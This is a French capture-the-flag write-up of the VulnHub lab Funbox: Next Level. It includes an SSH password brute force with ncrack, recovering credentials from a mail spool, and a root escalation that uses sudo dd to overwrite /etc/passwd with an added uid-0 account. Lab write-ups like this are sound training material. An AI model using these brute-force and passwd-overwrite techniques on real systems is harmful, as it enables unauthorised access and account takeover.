### Je ne suis pas celle que vous croyez

[Funbox: Next Level](https://vulnhub.com/entry/funbox-next-level,547/) est le numéro 5 des CTFs "Funbox".

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.124
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.124
Host is up (0.0013s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
--- snip ---
|       1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
|       1337DAY-ID-26468        0.0     https://vulners.com/zdt/1337DAY-ID-26468        *EXPLOIT*
|_      1337DAY-ID-25391        0.0     https://vulners.com/zdt/1337DAY-ID-25391        *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-enum: 
|_  /robots.txt: Robots file
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
--- snip ---
```

J'ai trouvé un dossier `drupal` via énumération web (avec `feroxbuster`).

On se rend vite compte que le Drupal est en réalité un Wordpress et qu'il semble configuré avec une IP qui n'est pas celle de la VM...

```console
$ curl -D- http://192.168.56.124/drupal/
HTTP/1.1 301 Moved Permanently
Date: Wed, 02 Jul 2025 14:26:04 GMT
Server: Apache/2.4.18 (Ubuntu)
X-Redirect-By: WordPress
Location: http://192.168.178.33/drupal/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Ça complique clairement les choses. Avec l'aide de l'IA Gemini j'ai fait un script `mitmproxy` qui va passer l'entête attendu `Host: 192.168.178.33` quand on tape sur 192.168.56.124 et qui va rediriger les requêtes à destination de 192.168.178.33 vers 192.168.56.124 :

```python
from mitmproxy import http
from mitmproxy import ctx

class CustomRouting:
    def request(self, flow: http.HTTPFlow):
        # Règle 1: Si l'URL demandée est 192.168.56.124
        if flow.request.pretty_url.startswith("http://192.168.56.124/"):
            # L'en-tête Host doit être 192.168.178.33
            flow.request.headers["Host"] = "192.168.178.33"
            # Le serveur cible réel de mitmproxy reste 192.168.56.124 (par défaut)
            ctx.log.info(f"RULE 1: Host header changed for {flow.request.pretty_url} to 192.168.178.33")

        # Règle 2: Si l'URL demandée est 192.168.178.33
        elif flow.request.pretty_url.startswith("http://192.168.178.33/"):
            # L'en-tête Host doit rester 192.168.178.33
            flow.request.headers["Host"] = "192.168.178.33"
            # MAIS, la connexion réelle de mitmproxy doit aller vers 192.168.56.124
            flow.request.host = "192.168.56.124"
            # Assurez-vous que le port est le bon pour HTTP (80 par défaut)
            flow.request.port = 80
            ctx.log.info(f"RULE 2: Rewriting target from {flow.request.pretty_url} to http://192.168.56.124/ and keeping Host: 192.168.178.33")

# Enregistre l'addon
addons = [
    CustomRouting()
]
```

On lance comme ça et on a notre proxy correcteur sur le port 8080 :

```bash
mitmproxy -s set_custom_host.py
```

Je peux configurer Firefox pour l'utiliser et je vois un billet nommé "Ben Aflag" avec le texte suivant :

> Welcome to Funbox: Next Level
> 
> flag(RnJvbSBub3cgb24sIHlvdSBrbmV3IGFib3V0IG1lIHdpdGhvdXQgYSAiZHJvb3BzY2FuIg==)

Soit une fois décodé :

```
From now on, you knew about me without a "droopscan"
```

Je lance ensuite `wpscan` pour qu'il utilise `mitmproxy` :

```bash
docker run -it --rm wpscanteam/wpscan --proxy http://192.168.56.1:8080/ --url http://192.168.56.124/drupal/ -e ap,at,u --plugins-detection aggressive
```

On n'apprend pas grand-chose, mis à part qu'il s'agit de `WordPress 5.5.1` et que deux utilisateurs sont présents ; infos qu'on pouvait avoir via le navigateur :

```console
[+] ben
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Mais nous sommes parvenus à faire tourner `wpscan` dans ces conditions et c'est déjà un exploit :)

### MailBox

À ce stade, faut-il brute-forcer Wordpress ou SSH ? J'ai opté pour le dernier :

```console
$ ncrack -f -u ben -P wordlists/rockyou.txt ssh://192.168.56.124

Starting Ncrack 0.8 ( http://ncrack.org )

Discovered credentials for ssh on 192.168.56.124 22/tcp:
192.168.56.124 22/tcp ssh: 'ben' 'pookie'

Ncrack done: 1 service scanned in 58.21 seconds.

Ncrack finished.
```

Une fois connecté avec SSH, on découvre assez vite une petite "surprise" :

```console
$ ssh ben@192.168.56.124
ben@192.168.56.124's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Tue Sep  1 22:14:28 2020 from 192.168.178.143
ben@funbox5:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),8(mail)
ben@funbox5:~$ sudo -l
[sudo] password for ben: 
Sorry, user ben may not run sudo on funbox5.
ben@funbox5:~$ ls -al
total 36
drwx------ 4 ben  ben  4096 Sep  1  2020 .
drwxr-xr-x 5 root root 4096 Aug 31  2020 ..
-rw------- 1 ben  ben    11 Sep  1  2020 .bash_history
-rw-r--r-- 1 ben  ben   220 Aug 31  2020 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Aug 31  2020 .bashrc
drwx------ 2 ben  ben  4096 Aug 31  2020 .cache
-rw-r--r-- 1 ben  ben   655 Aug 31  2020 .profile
-rw------- 1 ben  ben   611 Aug 31  2020 .viminfo
drwx------ 3 ben  ben  4096 Aug 31  2020 mail
ben@funbox5:~$ mail
-bash: /usr/bin/mail: Permission denied
ben@funbox5:~$ ls mail/
ben@funbox5:~$ ls /var/spool/mail/ben -al
-rw-rw---- 1 ben mail 1749 Sep  1  2020 /var/spool/mail/ben
ben@funbox5:~$ cat /var/spool/mail/ben
-bash: /bin/cat: Permission denied
ben@funbox5:~$ ls -al /bin/cat
-rwx------ 1 root root 52080 Mar  2  2017 /bin/cat
ben@funbox5:~$ tac /var/spool/mail/ben

No more hints.



--- snip ---


adam: qwedsayxc!
The new employees must be created. I've already finished Adam.
please come to my office at 10:00 a.m. We have a lot to talk about!

Hi Ben,

X-UID: 3                                                 
Status: RO
Message-Id: <202008311304.07VD43wQ015008@funbox5.fritz.box>
From: maria@funbox5.fritz.box
Date: Mon, 31 Aug 2020 15:04:03 +0200
        for ben@localhost; Mon, 31 Aug 2020 15:04:40 +0200
        by funbox5.fritz.box (8.15.2/8.15.2/Debian-3) with SMTP id 07VD43wQ015008
Received: from funbox4 (localhost [127.0.0.1])
Return-Path: <maria@funbox5.fritz.box>
From maria@funbox5.fritz.box  Mon Aug 31 15:04:50 2020

did you do all the updates?

Hey Ben,

X-UID: 2                                                 
Status: RO
Message-Id: <202008311254.07VCk80h014898@funbox5.fritz.box>
From: maria@funbox5.fritz.box
Date: Mon, 31 Aug 2020 14:54:40 +0200
        for ben@localhost; Mon, 31 Aug 2020 14:54:40 +0200
        by funbox5.fritz.box (8.15.2/8.15.2/Debian-3) with SMTP id 07VCk80h014898
Received: from funbox4 (localhost [127.0.0.1])
Return-Path: <maria@funbox5.fritz.box>
From maria@funbox5.fritz.box  Mon Aug 31 14:56:12 2020

are you going to Jonas' party on Saturday?
Hi Ben,

X-UID: 1                                                 
X-IMAPbase: 1598894832 0000000003
Status: RO
Message-Id: <202008311247.07VCk80g014898@funbox5.fritz.box>
From: maria@funbox5.fritz.box
Date: Mon, 31 Aug 2020 14:46:08 +0200
        for ben@localhost; Mon, 31 Aug 2020 14:47:42 +0200
        by funbox5.fritz.box (8.15.2/8.15.2/Debian-3) with SMTP id 07VCk80g014898
Received: from funbox4 (localhost [127.0.0.1])
Return-Path: <maria@funbox5.fritz.box>
From maria@funbox5.fritz.box  Mon Aug 31 14:52:15 2020
```

Certaines commandes sur le système nous sont inaccessibles à cause des permissions, mais avec `tac` qui affiche les lignes à l'envers, j'ai pu retrouver un mot de passe pour `adam`.

```console
adam@funbox5:~$ sudo -l
[sudo] password for adam: 
Matching Defaults entries for adam on funbox5:
    env_reset

User adam may run the following commands on funbox5:
    (root) PASSWD: /bin/dd
    (root) PASSWD: /bin/de
    (root) PASSWD: /bin/df
adam@funbox5:~$ ls -al /bin/dd /bin/de /bin/df
ls: cannot access '/bin/de': No such file or directory
-rwxr-xr-x 1 root root 72632 Mar  2  2017 /bin/dd
-rwxr-xr-x 1 root root 97912 Mar  2  2017 /bin/df
adam@funbox5:~$ ls -ald /bin/
drwxr-xr-x 2 root root 4096 Sep  1  2020 /bin/
```

Sans trop de surprises, on ne peut pas écraser les binaires existants.

On va s'en sortir avec l'outil de copie `dd` :

```console
adam@funbox5:~$ cp /etc/passwd passwd
adam@funbox5:~$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> passwd
adam@funbox5:~$ dd if=passwd of=/etc/passwd
dd: failed to open '/etc/passwd': Permission denied
adam@funbox5:~$ sudo dd if=passwd of=/etc/passwd
4+1 records in
4+1 records out
2061 bytes (2.1 kB, 2.0 KiB) copied, 0.0011433 s, 1.8 MB/s
adam@funbox5:~$ su devloop
Password: 
# cd /root
# ls
flag.txt
# cat flag.txt
 _______           _                     ______                      _                       _ 
(_______)         | |                   |  ___ \             _      | |                     | |
 _____ _   _ ____ | | _   ___ _   _ _   | |   | | ____ _   _| |_    | |      ____ _   _ ____| |
|  ___) | | |  _ \| || \ / _ ( \ / |_)  | |   | |/ _  | \ / )  _)   | |     / _  ) | | / _  ) |
| |   | |_| | | | | |_) ) |_| ) X ( _   | |   | ( (/ / ) X (| |__   | |____( (/ / \ V ( (/ /| |
|_|    \____|_| |_|____/ \___(_/ \_|_)  |_|   |_|\____|_/ \_)\___)  |_______)____) \_/ \____)_|

Made with ❤ by @0815R2d2
Please, tweet me a screenshot on Twitter.
THX 4 playing this Funbox.
```
